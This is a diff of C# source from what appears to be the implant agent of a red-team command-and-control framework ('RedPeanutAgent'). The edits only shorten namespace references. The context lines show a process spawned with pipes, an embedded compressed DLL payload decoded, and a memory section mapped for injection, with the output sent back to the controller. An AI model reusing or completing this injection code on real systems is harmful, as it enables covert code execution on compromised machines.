@@ -16,15 +16,15 @@ namespace RedPeanutAgent.Execution
 {
     class CommandExecuter
     {
-        RedPeanutAgent.Core.Utility.TaskMsg task;
+        Core.Utility.TaskMsg task;
         NamedPipeClientStream pipe;
-        RedPeanutAgent.Core.Utility.CookiedWebClient wc;
+        Core.Utility.CookiedWebClient wc;
         byte[] aeskey;
         byte[] aesiv;
         string agentid;
         string processname;
 
-        public CommandExecuter(RedPeanutAgent.Core.Utility.TaskMsg task, NamedPipeClientStream pipe, Utility.CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string agentid, string processname)
+        public CommandExecuter(Core.Utility.TaskMsg task, NamedPipeClientStream pipe, Core.Utility.CookiedWebClient wc, byte[] aeskey, byte[] aesiv, string agentid, string processname)
         {
             this.task = task;
             this.pipe = pipe;
@@ -166,7 +166,7 @@ namespace RedPeanutAgent.Execution
                 return;
             }
 
-            Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();
+            Core.Natives.PROCESS_INFORMATION procInfo = new Core.Natives.PROCESS_INFORMATION();
             if (!Spawner.CreateProcess(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
             {
                 return;
@@ -175,7 +175,7 @@ namespace RedPeanutAgent.Execution
             string pipename = GetPipeName(procInfo.dwProcessId);
             InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, task);
 
-            byte[] payload = Utility.DecompressDLL(Convert.FromBase64String(Program.nutclr));
+            byte[] payload = Core.Utility.DecompressDLL(Convert.FromBase64String(Program.nutclr));
 
             //Round payload size to page size
             uint size = InjectionHelper.GetSectionSize(payload.Length);
@@ -191,7 +191,7 @@ namespace RedPeanutAgent.Execution
             //Map section to current process
             IntPtr baseAddr = IntPtr.Zero;
             IntPtr viewSize = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
+            InjectionHelper.MapViewOfSection(section, Core.Natives.GetCurrentProcess(), ref baseAddr, ref viewSize);
             if (baseAddr == IntPtr.Zero)
             {
                 return;
@@ -230,8 +230,8 @@ namespace RedPeanutAgent.Execution
 
             output = injectionLoaderListener.Execute(procInfo.hProcess, hReadPipe);
 
-            Natives.CloseHandle(procInfo.hThread);
-            Natives.CloseHandle(procInfo.hProcess);
+            Core.Natives.CloseHandle(procInfo.hThread);
+            Core.Natives.CloseHandle(procInfo.hProcess);
 
             SendResponse(output);
         }
